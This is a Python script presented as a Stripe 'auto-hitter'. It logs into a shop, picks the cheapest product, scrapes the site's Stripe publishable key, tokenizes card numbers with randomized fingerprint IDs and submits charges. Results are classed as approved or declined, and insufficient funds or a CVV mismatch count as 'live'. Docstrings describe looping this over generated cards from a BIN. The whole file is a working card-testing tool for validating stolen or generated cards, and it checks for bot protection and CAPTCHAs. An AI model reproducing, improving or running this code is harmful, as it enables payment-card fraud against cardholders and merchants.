"""
stripe_web_auto.py — Generic Stripe website auto-hitter
Logs into any Stripe-powered e-commerce site, finds the cheapest
product, adds it to cart, extracts the Stripe PK, tokenizes the
card, and charges it.
"""

import ipaddress
import re
import random
import socket
import time
import requests
from urllib.parse import urljoin, urlparse

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Safari/537.36"
)

_DEFAULT_HEADERS = {
    "User-Agent": USER_AGENT,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
}

# Common login form paths
_LOGIN_PATHS = [
    "/login",
    "/account/login",
    "/sign-in",
    "/signin",
    "/user/login",
    "/my-account",
    "/wp-login.php",
    "/auth/login",
]

# Common patterns for Stripe public key
_PK_PATTERNS = [
    r'pk_live_[A-Za-z0-9]{20,}',
    r'pk_test_[A-Za-z0-9]{20,}',
]

# ── SSRF Protection ───────────────────────────────────────────────────────────
_PRIVATE_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),   # link-local
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fc00::/7"),
    ipaddress.ip_network("fe80::/10"),
    ipaddress.ip_network("100.64.0.0/10"),    # shared address space (CGNAT)
    ipaddress.ip_network("0.0.0.0/8"),
]


def _check_host_ssrf(hostname: str) -> None:
    """
    Resolve hostname and raise ValueError if it points to a private/internal
    address.  Called for the initial URL and every redirect hop.
    """
    if not hostname:
        raise ValueError("Invalid URL — no hostname")

    try:
        addr = ipaddress.ip_address(hostname)
        for net in _PRIVATE_NETWORKS:
            if addr in net:
                raise ValueError("Requests to private/internal addresses are not allowed")
        return  # raw IP that is public — OK
    except ValueError as ve:
        if "private" in str(ve) or "internal" in str(ve):
            raise

    # Not a raw IP — resolve hostname
    try:
        resolved_ip = socket.gethostbyname(hostname)
        addr = ipaddress.ip_address(resolved_ip)
        for net in _PRIVATE_NETWORKS:
            if addr in net:
                raise ValueError(f"Hostname resolves to a private/internal IP ({resolved_ip})")
    except ValueError:
        raise
    except Exception:
        pass  # DNS failure — let requests handle it naturally


def _validate_url(url: str) -> str:
    """
    Validate the user-supplied URL against SSRF.
    Returns normalised https:// URL on success.
    Raises ValueError with a user-friendly message on failure.
    """
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Only http/https URLs are allowed")

    _check_host_ssrf(parsed.hostname or "")
    return url.rstrip("/")


def _ssrf_redirect_hook(response, **kwargs):
    """
    Response hook installed on every _make_session() session.
    Fires for every HTTP response in the redirect chain.
    If the response is a redirect, validates the Location target before
    requests follows it, blocking redirects to private/internal hosts.
    """
    if response.is_redirect:
        location = response.headers.get("Location", "")
        if location:
            try:
                # Resolve relative redirects against the current URL
                abs_loc = urljoin(response.url, location)
                parsed = urlparse(abs_loc)
                if parsed.scheme not in ("http", "https"):
                    raise ValueError(f"Redirect to non-http(s) scheme blocked: {parsed.scheme}")
                _check_host_ssrf(parsed.hostname or "")
            except ValueError as ve:
                # Raise so requests propagates it as an exception rather than
                # silently following the redirect to an internal target.
                raise requests.exceptions.InvalidURL(str(ve))


def _make_session() -> requests.Session:
    s = requests.Session()
    s.headers.update(_DEFAULT_HEADERS)
    # Attach the SSRF redirect guard so every hop in a redirect chain is
    # validated before requests follows it.
    s.hooks["response"].append(_ssrf_redirect_hook)
    return s


def _extract_stripe_pk(html_text: str) -> str | None:
    for pat in _PK_PATTERNS:
        m = re.search(pat, html_text)
        if m:
            return m.group(0)
    return None


_CLOUDFLARE_MARKERS = [
    "cf-ray",
    "checking your browser",
    "just a moment",
    "cloudflare ray id",
    "__cf_bm",
    "ddos-guard",
    "attention required | cloudflare",
    "enable javascript and cookies to continue",
]

_CAPTCHA_MARKERS = [
    "g-recaptcha",
    "recaptcha",
    "hcaptcha",
    "h-captcha",
    "data-sitekey",
    "captcha",
]


def _detect_bot_protection(response: requests.Response) -> str | None:
    """
    Inspect a response for signs of bot-protection, rate-limiting, or CAPTCHA.
    Returns a user-facing error string if detected, or None if the response looks clean.
    """
    status = response.status_code

    # HTTP 429 — explicit rate-limit response
    if status == 429:
        return "Site is rate-limiting — try again later"

    body = response.text.lower()
    headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}

    # Cloudflare/bot-protection: header signals
    cf_header = "cf-ray" in headers_lower or "cf-mitigated" in headers_lower

    # Cloudflare/bot-protection: body signals
    cf_body = any(marker in body for marker in _CLOUDFLARE_MARKERS)

    if cf_header or cf_body:
        return "Site is protected by Cloudflare — cannot auto-hit"

    # HTTP 503 without Cloudflare markers still suggests a bot wall
    if status == 503:
        return "Site is rate-limiting — try again later"

    return None


def _detect_captcha(html: str) -> bool:
    """Return True if the page contains a CAPTCHA challenge."""
    lower = html.lower()
    return any(marker in lower for marker in _CAPTCHA_MARKERS)


def _find_login_url(
    session: requests.Session, site_url: str
) -> tuple[str | None, str | None, str | None]:
    """
    Return (login_url, page_html, error) for the first working login path.
    On success: (url, html, None).
    On bot/rate-limit/captcha detection (after all paths exhausted): (None, None, error_message).
    When no login page is found at all: (None, None, None).

    Protection errors are tracked across all paths but do not cause an early exit —
    a later path may succeed even if an earlier one was blocked.
    """
    last_protection_error: str | None = None

    for path in _LOGIN_PATHS:
        try:
            url = site_url + path
            r = session.get(url, timeout=15, allow_redirects=True)

            # Check for bot-protection but continue to the next path rather than
            # exiting immediately — another login path on the same site may be
            # unguarded.
            protection_error = _detect_bot_protection(r)
            if protection_error:
                last_protection_error = protection_error
                continue

            if r.status_code == 200 and any(
                kw in r.text.lower()
                for kw in ["password", "email", "log in", "login", "sign in"]
            ):
                if _detect_captcha(r.text):
                    return None, None, "Login requires CAPTCHA — not supported by /wah"
                return r.url, r.text, None
        except Exception:
            continue

    # No valid login page found; surface protection error if one was encountered.
    return None, None, last_protection_error


def _extract_form_fields(html_text: str, form_action_hint: str = "") -> dict:
    """Extract hidden form fields (CSRF tokens, etc.) from HTML."""
    fields = {}
    for m in re.finditer(
        r'<input[^>]+type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
        html_text,
        re.IGNORECASE,
    ):
        fields[m.group(1)] = m.group(2)
    for m in re.finditer(
        r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\']hidden["\'][^>]*value=["\']([^"\']*)["\']',
        html_text,
        re.IGNORECASE,
    ):
        fields[m.group(1)] = m.group(2)
    for m in re.finditer(
        r'<meta[^>]+name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']',
        html_text,
        re.IGNORECASE,
    ):
        fields["_token"] = m.group(1)
        fields["csrf_token"] = m.group(1)
    return fields


def login_to_site(
    session: requests.Session, site_url: str, email: str, password: str
) -> dict:
    """
    Attempt form-based login.
    Returns {"ok": True} on success, {"ok": False, "error": "..."} on failure.
    """
    login_url, login_html, find_error = _find_login_url(session, site_url)
    if not login_url:
        error_msg = find_error if find_error else "Login page not found"
        return {"ok": False, "error": error_msg}

    hidden = _extract_form_fields(login_html)

    payload = {**hidden, "email": email, "password": password}
    payload.setdefault("username", email)
    payload.setdefault("log", email)
    payload.setdefault("pwd", password)
    payload.setdefault("rememberme", "forever")
    payload.setdefault("redirect", "")

    form_action = None
    m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', login_html, re.IGNORECASE)
    if m:
        form_action = urljoin(login_url, m.group(1))
    post_url = form_action or login_url

    try:
        r = session.post(
            post_url,
            data=payload,
            timeout=20,
            allow_redirects=True,
            headers={"Referer": login_url, "Content-Type": "application/x-www-form-urlencoded"},
        )
        body_lower = r.text.lower()
        if any(kw in body_lower for kw in ["incorrect password", "invalid credentials",
                                             "wrong password", "no account found",
                                             "does not exist", "invalid email"]):
            return {"ok": False, "error": "Invalid credentials"}
        return {"ok": True, "final_url": r.url}
    except requests.Timeout:
        return {"ok": False, "error": "Login timeout"}
    except Exception as e:
        return {"ok": False, "error": str(e)[:60]}


def find_cheapest_product(session: requests.Session, site_url: str) -> dict | None:
    """
    Scrape the site for products and return info about the cheapest available one.
    Returns dict with keys: title, price, product_url, variant_id (if any)
    or None if nothing found.
    """
    # 1. Try Shopify /products.json endpoint first
    for path in ["/products.json", "/collections/all/products.json"]:
        try:
            r = session.get(site_url + path, timeout=15)
            if r.status_code == 200:
                data = r.json()
                products = data.get("products", [])
                cheapest = None
                cheapest_price = float("inf")
                for product in products:
                    for variant in product.get("variants", []):
                        if not variant.get("available", True):
                            continue
                        try:
                            price = float(variant.get("price", 0))
                        except (TypeError, ValueError):
                            continue
                        if 0 < price < cheapest_price:
                            cheapest_price = price
                            handle = product.get("handle", "")
                            cheapest = {
                                "title": product.get("title", "Unknown"),
                                "price": price,
                                "product_url": f"{site_url}/products/{handle}",
                                "variant_id": variant.get("id"),
                                "source": "shopify_json",
                            }
                if cheapest:
                    return cheapest
        except Exception:
            pass

    # 2. Scrape generic product listing pages
    for path in ["/shop", "/products", "/store", "/collections/all", "/"]:
        try:
            r = session.get(site_url + path, timeout=15)
            if r.status_code != 200:
                continue
            html = r.text
            price_pattern = re.compile(
                r'(?:href=["\'])(/[^"\']+)["\'][^<]*?(?:<[^>]+>)*?[^<]*?'
                r'[\$£€]\s*([\d,]+\.?\d*)',
                re.IGNORECASE | re.DOTALL,
            )
            cheapest = None
            cheapest_price = float("inf")
            for m in price_pattern.finditer(html):
                link = m.group(1)
                price_str = m.group(2).replace(",", "")
                try:
                    price = float(price_str)
                except ValueError:
                    continue
                if 0 < price < cheapest_price:
                    cheapest_price = price
                    cheapest = {
                        "title": link.split("/")[-1].replace("-", " ").title(),
                        "price": price,
                        "product_url": site_url + link,
                        "variant_id": None,
                        "source": "html_scrape",
                    }
            if cheapest:
                return cheapest
        except Exception:
            continue

    return None


def checkout_and_charge(
    session: requests.Session,
    site_url: str,
    product_info: dict,
    card: dict,
) -> dict:
    """
    Add product to cart, navigate to checkout, extract Stripe PK,
    tokenize the card and submit.  Returns a result dict with keys:
      status  — "approved" | "declined" | "error"
      message — human-readable result string
      stripe_pk — the PK found (if any)

    Only returns "approved" when a confirmed positive signal is received
    (3DS required, succeeded, insufficient funds, CVV mismatch, etc.).
    Returns "error" when the merchant response is ambiguous or absent.
    """
    product_url = product_info.get("product_url", "")
    variant_id = product_info.get("variant_id")

    # ── Step 1: Add to cart ───────────────────────────────────────────────────
    cart_added = False
    if variant_id:
        try:
            r = session.post(
                f"{site_url}/cart/add.js",
                data={"id": str(variant_id), "quantity": "1"},
                headers={"Accept": "application/json", "X-Requested-With": "XMLHttpRequest",
                         "Referer": site_url},
                timeout=15,
            )
            if r.status_code == 200:
                cart_added = True
        except Exception:
            pass

    if not cart_added and product_url:
        try:
            r_prod = session.get(product_url, timeout=15)
            if r_prod.status_code == 200:
                hidden = _extract_form_fields(r_prod.text)
                add_url_m = re.search(
                    r'<form[^>]+action=["\']([^"\']*cart[^"\']*)["\']',
                    r_prod.text, re.IGNORECASE
                )
                add_url = urljoin(product_url, add_url_m.group(1)) if add_url_m else f"{site_url}/cart/add"
                payload = {**hidden, "quantity": "1"}
                for m in re.finditer(
                    r'name=["\'](?:id|variant_id|product_id|add)["\'][^>]*value=["\']([^"\']+)["\']',
                    r_prod.text, re.IGNORECASE
                ):
                    payload.setdefault("id", m.group(1))
                session.post(add_url, data=payload, timeout=15, allow_redirects=True)
                cart_added = True
        except Exception:
            pass

    # ── Step 2: Go to checkout and find Stripe PK ────────────────────────────
    stripe_pk = None
    checkout_html = ""
    for checkout_path in ["/checkout", "/cart", "/shop/checkout", "/order"]:
        try:
            r_co = session.get(site_url + checkout_path, timeout=20, allow_redirects=True)
            if r_co.status_code == 200:
                checkout_html = r_co.text
                stripe_pk = _extract_stripe_pk(checkout_html)
                if stripe_pk:
                    break
        except Exception:
            continue

    # Also try JS files linked from checkout page for PK
    if not stripe_pk and checkout_html:
        for js_url in re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', checkout_html, re.IGNORECASE):
            if "stripe" in js_url.lower() or "checkout" in js_url.lower() or "payment" in js_url.lower():
                try:
                    full_js = urljoin(site_url, js_url)
                    rj = session.get(full_js, timeout=10)
                    stripe_pk = _extract_stripe_pk(rj.text)
                    if stripe_pk:
                        break
                except Exception:
                    continue

    if not stripe_pk:
        return {
            "status": "error",
            "message": "Stripe PK not found on checkout page",
            "stripe_pk": None,
        }

    # ── Step 3: Tokenize card via Stripe API ─────────────────────────────────
    cc = card["cc"]
    mm = card["mm"]
    yy = card["yy"]
    cvv = card["cvv"]

    def _rand_fp():
        r = lambda a, b: random.randint(a, b)
        return (
            f"{r(10000000,99999999)}-{r(1000,9999)}-{r(1000,9999)}-"
            f"{r(1000,9999)}-{r(100000000000,999999999999)}"
        )

    stripe_headers = {
        "authority": "api.stripe.com",
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": USER_AGENT,
    }
    stripe_data = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "guid": _rand_fp(),
        "muid": _rand_fp(),
        "sid": _rand_fp(),
        "key": stripe_pk,
    }

    try:
        r_stripe = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            data=stripe_data,
            headers=stripe_headers,
            timeout=20,
        )
        stripe_resp = r_stripe.json()
    except Exception as e:
        return {"status": "error", "message": f"Stripe API error: {str(e)[:50]}", "stripe_pk": stripe_pk}

    if "error" in stripe_resp:
        err = stripe_resp["error"]
        code = err.get("code", "")
        msg = err.get("message", "Card Declined")
        decline_map = {
            "incorrect_number": "Incorrect Card Number",
            "invalid_number": "Invalid Card Number",
            "invalid_expiry_year": "Invalid Expiry Year",
            "invalid_expiry_month": "Invalid Expiry Month",
            "invalid_cvc": "Invalid CVC",
            "expired_card": "Expired Card",
        }
        return {
            "status": "declined",
            "message": f"Declined - {decline_map.get(code, msg)}",
            "stripe_pk": stripe_pk,
        }

    payment_id = stripe_resp.get("id")
    if not payment_id:
        return {"status": "error", "message": "No payment method ID from Stripe", "stripe_pk": stripe_pk}

    # ── Step 4: Submit payment to merchant ───────────────────────────────────
    hidden = _extract_form_fields(checkout_html)
    csrf_token = hidden.get("csrf_token") or hidden.get("_token") or hidden.get("authenticity_token")

    odoo_data = {
        "jsonrpc": "2.0",
        "method": "call",
        "params": {
            "data_set": "/payment/stripe/s2s/create_json_3ds",
            "stripe_publishable_key": stripe_pk,
            "return_url": "/shop/payment/validate",
            "csrf_token": csrf_token or "",
            "payment_method": payment_id,
        },
        "id": random.randint(100000, 999999),
    }
    payment_endpoints = [
        (f"{site_url}/payment/stripe/s2s/create_json_3ds", "json"),
        (f"{site_url}/checkout/payment", "form"),
        (f"{site_url}/shop/payment/validate", "form"),
    ]

    merchant_responded = False
    for ep_url, ep_type in payment_endpoints:
        try:
            if ep_type == "json":
                r_pay = session.post(ep_url, json=odoo_data, headers={
                    "Content-Type": "application/json",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": f"{site_url}/shop/payment",
                    "Accept": "application/json",
                }, timeout=20)
            else:
                r_pay = session.post(ep_url, data={
                    "payment_method_id": payment_id,
                    "stripeToken": payment_id,
                    "csrf_token": csrf_token or "",
                }, timeout=20, allow_redirects=True)

            # Only trust non-redirect, non-login responses
            if r_pay.status_code in (401, 403, 404):
                continue
            merchant_responded = True

            resp_text = r_pay.text.lower()
            try:
                resp_json = r_pay.json()
            except Exception:
                resp_json = {}

            result_str = str(resp_json).lower() + resp_text

            if any(k in result_str for k in ["authentication_required", "3d_secure", "requires_action"]):
                return {"status": "approved", "message": "Approved ♻️ 3D Secure Required", "stripe_pk": stripe_pk}
            if any(k in result_str for k in ["succeeded", '"success": true', "'success': true", "order_id", "thank you", "thank-you", "order confirmed"]):
                return {"status": "approved", "message": "Approved ✅ Transaction Successful", "stripe_pk": stripe_pk}
            if "insufficient_funds" in result_str:
                return {"status": "approved", "message": "Approved ♻️ Insufficient Funds", "stripe_pk": stripe_pk}
            if any(k in result_str for k in ["incorrect_cvc", "security code is incorrect"]):
                return {"status": "approved", "message": "Approved ♻️ CVV Mismatch", "stripe_pk": stripe_pk}
            if any(k in result_str for k in ["card was declined", "do_not_honor", "declined", "card_declined"]):
                return {"status": "declined", "message": "Declined ❌ Card Declined", "stripe_pk": stripe_pk}
            if any(k in result_str for k in ["incorrect_number", "invalid_number", "invalid_expiry"]):
                return {"status": "declined", "message": "Declined ❌ Invalid Card Details", "stripe_pk": stripe_pk}

        except Exception:
            continue

    # Stripe tokenization passed but merchant response was absent or ambiguous:
    # card passed Stripe validation but we cannot confirm charge outcome.
    if merchant_responded:
        return {
            "status": "error",
            "message": "Error - Merchant response was ambiguous (card tokenized OK)",
            "stripe_pk": stripe_pk,
        }
    return {
        "status": "error",
        "message": "Error - Could not reach merchant payment endpoint",
        "stripe_pk": stripe_pk,
    }


def setup_wah_session(site_url: str, email: str, password: str) -> dict:
    """
    Phase 1 of the BIN-loop pipeline: validate URL, login, find cheapest product.
    Returns {"ok": True, "session": s, "product": p, "site_url": url} on success
    or {"ok": False, "error": "..."} on failure.
    Call this once; pass the returned session+product to charge_wah_card() for
    each generated card so login/product-scrape overhead is paid only once.
    """
    try:
        site_url = _validate_url(site_url)
    except ValueError as ve:
        return {"ok": False, "error": f"Invalid URL: {ve}"}

    session = _make_session()

    login_result = login_to_site(session, site_url, email, password)
    if not login_result["ok"]:
        return {"ok": False, "error": f"Login failed: {login_result['error']}"}

    product = find_cheapest_product(session, site_url)
    if not product:
        return {"ok": False, "error": "No products found on site"}

    return {"ok": True, "session": session, "product": product, "site_url": site_url}


def charge_wah_card(
    session: "requests.Session",
    site_url: str,
    product: dict,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
) -> dict:
    """
    Phase 2 of the BIN-loop pipeline: run checkout+charge for a single card
    against an already-logged-in session with a known product.
    Returns the same dict shape as run_wah() but without product_title/price
    (caller already knows those from setup_wah_session).
    """
    start = time.time()
    card = {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
    charge_result = checkout_and_charge(session, site_url, product, card)
    return {
        "status": charge_result["status"],
        "message": charge_result["message"],
        "stripe_pk": charge_result.get("stripe_pk"),
        "elapsed": round(time.time() - start, 2),
    }


def run_wah(site_url: str, email: str, password: str, cc: str, mm: str, yy: str, cvv: str) -> dict:
    """
    Full pipeline: validate URL → login → find cheapest product → checkout → charge.
    Returns dict with keys: status, message, product_title, product_price,
    stripe_pk, elapsed.
    """
    start = time.time()

    # SSRF guard — validate before any network activity
    try:
        site_url = _validate_url(site_url)
    except ValueError as ve:
        return {
            "status": "error",
            "message": f"Invalid URL: {ve}",
            "product_title": None,
            "product_price": None,
            "stripe_pk": None,
            "elapsed": round(time.time() - start, 2),
        }

    session = _make_session()

    # Login
    login_result = login_to_site(session, site_url, email, password)
    if not login_result["ok"]:
        return {
            "status": "error",
            "message": f"Login failed: {login_result['error']}",
            "product_title": None,
            "product_price": None,
            "stripe_pk": None,
            "elapsed": round(time.time() - start, 2),
        }

    # Find cheapest product
    product = find_cheapest_product(session, site_url)
    if not product:
        return {
            "status": "error",
            "message": "No products found on site",
            "product_title": None,
            "product_price": None,
            "stripe_pk": None,
            "elapsed": round(time.time() - start, 2),
        }

    card = {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
    charge_result = checkout_and_charge(session, site_url, product, card)

    return {
        "status": charge_result["status"],
        "message": charge_result["message"],
        "product_title": product["title"],
        "product_price": product["price"],
        "stripe_pk": charge_result.get("stripe_pk"),
        "elapsed": round(time.time() - start, 2),
    }
